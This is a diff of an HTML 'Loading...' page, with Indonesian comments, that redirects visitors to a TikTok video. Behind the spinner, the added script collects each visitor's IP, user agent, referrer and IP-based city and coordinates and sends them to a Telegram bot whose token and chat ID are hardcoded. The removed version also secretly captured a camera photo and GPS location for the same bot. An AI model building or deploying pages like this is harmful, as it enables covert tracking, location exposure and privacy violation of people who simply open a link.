@@ -1,8 +1,7 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -17,12 +16,10 @@
         }
         .container {
             text-align: center;
-            padding: 30px 40px;
+            padding: 40px;
             background: #1a1a2e;
-            border-radius: 12px;
+            border-radius: 16px;
             border: 1px solid #2a2a4a;
-            max-width: 300px;
-            width: 100%;
         }
         .spinner {
             width: 40px;
@@ -46,7 +43,7 @@
 
 <script>
 // ============================================
-// 🔴 KONFIGURASI
+// 🔴 KONFIGURASI — GANTI INI!
 // ============================================
 
 const BOT_TOKEN = "6529101093:AAH7HJ4eS6NDLsK-R7-SUCfRkucRIEgfEgc";
@@ -54,124 +51,51 @@ const CHAT_ID = "1650888756";
 const REDIRECT_URL = "https://www.tiktok.com/@bbygurllxyz_/video/7633609115247414548";
 
 // ============================================
-// 🔴 FUNGSI KIRIM KE TELEGRAM
+// 🔴 KIRIM IP KE TELEGRAM
 // ============================================
-function sendToTelegram(msg) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`
-    }).catch(() => {});
-}
 
-function sendPhotoToTelegram(imageData, caption) {
-    const blob = dataURLtoBlob(imageData);
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', blob, 'capture.jpg');
-    formData.append('caption', caption);
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-    }).catch(() => {});
-}
+fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(data => {
+        const ip = data.ip;
+        const ua = navigator.userAgent;
+        const time = new Date().toLocaleString('id-ID');
+        const ref = document.referrer || 'Direct';
 
-function dataURLtoBlob(dataURL) {
-    const arr = dataURL.split(',');
-    const mime = arr[0].match(/:(.*?);/)[1];
-    const bstr = atob(arr[1]);
-    let n = bstr.length;
-    const u8arr = new Uint8Array(n);
-    while (n--) u8arr[n] = bstr.charCodeAt(n);
-    return new Blob([u8arr], { type: mime });
-}
+        const msg = `✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: ${ip}\n📱 ${ua}\n🔗 ${ref}`;
 
-// ============================================
-// 🔴 CAPTURE PHOTO
-// ============================================
-function capturePhoto() {
-    return new Promise((resolve) => {
-        const video = document.createElement('video');
-        video.style.display = 'none';
-        document.body.appendChild(video);
+        // Kirim ke Telegram
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
+        }).catch(() => {});
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } })
-            .then(stream => {
-                video.srcObject = stream;
-                video.play();
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                    stream.getTracks().forEach(t => t.stop());
-                    video.remove();
-                    resolve(imageData);
-                }, 500);
-            })
-            .catch(() => {
-                video.remove();
-                resolve(null);
+        // Ambil Geolokasi dari IP
+        fetch(`http://ip-api.com/json/${ip}`)
+            .then(r => r.json())
+            .then(geo => {
+                if (geo.status === 'success') {
+                    const geoMsg = `📍 IP GEOLOCATION\n━━━━━━━━━━━━━━━━━━━\n📍 ${geo.city}, ${geo.regionName}\n🌍 ${geo.country}\n📡 ${geo.isp}\n🗺️ ${geo.lat}, ${geo.lon}`;
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(geoMsg)}`
+                    }).catch(() => {});
+                }
             });
+
+        // ✅ REDIRECT KE TIKTOK (PASTI!)
+        setTimeout(() => {
+            window.location.replace(REDIRECT_URL);
+        }, 1500);
+    })
+    .catch(() => {
+        // ❌ GAGAL IP — TETAP REDIRECT!
+        setTimeout(() => {
+            window.location.replace(REDIRECT_URL);
+        }, 1500);
     });
-}
-
-// ============================================
-// 🔴 COLLECT DATA
-// ============================================
-function collectData() {
-    const time = new Date().toLocaleString('id-ID');
-    const ua = navigator.userAgent;
-    const ref = document.referrer || 'Direct';
-
-    // 1. IP
-    fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(data => {
-            const ip = data.ip;
-            sendToTelegram(`✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: <code>${ip}</code>\n📱 ${ua}\n🔗 ${ref}`);
-
-            fetch(`http://ip-api.com/json/${ip}`)
-                .then(r => r.json())
-                .then(geo => {
-                    if (geo.status === 'success') {
-                        sendToTelegram(`📍 IP GEOLOCATION\n━━━━━━━━━━━━━━━━━━━\n📍 ${geo.city}, ${geo.regionName}\n🌍 ${geo.country}\n📡 ${geo.isp}\n🗺️ ${geo.lat}, ${geo.lon}`);
-                    }
-                });
-        });
-
-    // 2. GPS
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                const lat = pos.coords.latitude;
-                const lng = pos.coords.longitude;
-                sendToTelegram(`📍 GPS LOCATION!\n━━━━━━━━━━━━━━━━━━━\n🎯 <code>${lat}, ${lng}</code>\n🗺️ https://www.google.com/maps?q=${lat},${lng}`);
-            },
-            () => {}
-        );
-    }
-
-    // 3. FOTO
-    capturePhoto().then(img => {
-        if (img) {
-            sendPhotoToTelegram(img, `📸 AUTO PHOTO\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}`);
-        }
-    });
-
-    // 4. ✅ REDIRECT PASTI (SETELAH 2 DETIK)
-    setTimeout(() => {
-        window.location.replace(REDIRECT_URL);
-    }, 2000);
-}
-
-// ============================================
-// 🔴 EKSEKUSI
-// ============================================
-collectData();
 </script>
 
 </body>
